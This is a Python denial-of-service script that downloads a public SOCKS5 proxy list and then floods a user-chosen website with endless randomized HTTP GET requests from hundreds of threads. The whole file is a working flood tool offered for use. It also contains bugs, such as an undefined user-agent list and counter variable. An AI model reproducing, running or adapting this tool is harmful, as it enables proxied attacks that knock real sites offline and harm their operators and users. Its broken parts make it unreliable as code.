import socks 
import socket 
import requests 
import threading 
import random 
import ssl 
import time
from colorama import Fore



print(Fore.RED + """
    ____        ______     ____       _____      ________  ___        __ __
   / __ \__  __/ ____/____/ __ \____ / ___/____ /_  __/ /_/   | _____/ //_/
  / /_/ / / / / /   / ___/ / / / __ \\__ \/ __ `//  / / __/ /| |/ ___/ , <
 / ____/ /_/ / /___/ /__/ /_/ / /_/ /__/ / /_/ // / / /_/ ___ / /__/ /| |
/_/    \__, /\____/\___/_____/\____/____/\__,_//_/  \__/_/  |_\___/_/ |_|
      /____/""")
print(Fore.WHITE + "Code By GogoZin -2019/8/21")
print("Version 1.2 ")

def opth(): #Open Threads 
	for _ in range(thr):
		x = threading.Thread(target=atk).start()
		print('Threads ' + str(g+1) + " Created ")

def clone(): #Get Socks5 List
	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all') #Code By GogoZin
	with open('socks5.txt','wb') as f:
		f.write(r.content)
		print('Sucess Get List !')
		
def main(): #Setup
	global url
	global port
	global thr
	global lsts
	global per
	global uu
	url = str(input('Target (Ex. www.google.com ) : '))
	if url =='':
		input("Error Input ! Try Again")
		return main()
	port = str(input('Port (Default Is 80) : '))
	if port =='':
		port = int(80)
	thr = str(input("Threads (1-800 Default Is 300) : "))
	if thr =='':
		thr = int(300)
	else:
		thr = int(thr)
	per = str(input("CC-Power (1-100 Default Is 70) : "))
	if per =='':
		per = int(70)
	else:
		per = int(per)
	uu = str(input("Path (Default Is / ) : "))
	if uu=='':
		uu ='/'
	gt = str(input('Get List? (y/n) : '))
	if gt =='y':
		clone()
	else:
		pass
	lst = str(input('Socks5 List (socks5.txt) : '))
	if lst =='':
		lst = 'socks5.txt'
	lsts = open(lst).readlines()
	print('Total Socks5 -> %d'%len(lsts))
	time.sleep(2)
	opth()
	

def atk(): #Socks Sent Requests
	ua = random.choice(useragent)
	proxy = random.choice(lsts).strip().split(":")
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]))
	while 1:
		try:
			s = socks.socksocket()
			s.connect((str(url), int(port)))
			try:
				for _ in range(per):
					s.send(str.encode("GET "+uu+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+url+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n"))
					s.send(str.encode("GET "+uu+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+url+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n"))
				print(Fore.CYAN + "ChallengeCollapsar From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #Code By GogoZin
			except:
				s.close()
		except:
			s.close()

if __name__=='__main__':
	main() #Code By GogoZin
